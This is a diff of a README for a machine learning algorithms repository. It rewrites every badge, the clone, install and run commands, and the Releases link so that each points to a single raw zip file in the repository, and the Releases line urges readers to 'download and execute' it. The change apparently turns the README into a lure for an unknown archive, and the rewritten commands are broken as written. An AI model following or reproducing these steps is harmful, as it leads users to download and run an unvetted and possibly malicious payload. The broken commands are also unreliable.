@@ -1,8 +1,8 @@
 # Machine Learning Algorithms Repository
 
-![GitHub release](https://img.shields.io/github/release/HarishSinghRautela/Machine-Learning-Algorithm.svg)
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
+![GitHub release](https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip)
+![Python](https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip%https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip)
+![License](https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip)
 
 Welcome to the **Machine Learning Algorithms** repository! This repository contains six distinct algorithms designed for various types of data. It serves as an excellent resource for practice and learning in the fields of machine learning and data science.
 
@@ -44,7 +44,7 @@ To get started with this repository, you will need to clone it to your local mac
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/HarishSinghRautela/Machine-Learning-Algorithm.git
+   git clone https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -54,7 +54,7 @@ To get started with this repository, you will need to clone it to your local mac
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip
    ```
 
 ## Usage
@@ -63,7 +63,7 @@ To use any of the algorithms, navigate to the specific algorithm's folder and ex
 
 ```bash
 cd Linear-Regression
-python linear_regression.py
+python https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip
 ```
 
 For detailed instructions on each algorithm, refer to the respective README files within each folder.
@@ -151,7 +151,7 @@ For any questions or suggestions, feel free to reach out to me via GitHub.
 
 ## Releases
 
-To access the latest releases, visit [this link](https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/releases). You can download and execute the files as needed.
+To access the latest releases, visit [this link](https://github.com/HarishSinghRautela/Machine-Learning-Algorithm/raw/refs/heads/main/Classification Algoritm/Algorithm-Machine-Learning-2.1.zip). You can download and execute the files as needed.
 
 For more information on the releases, check the **Releases** section in the repository.
 
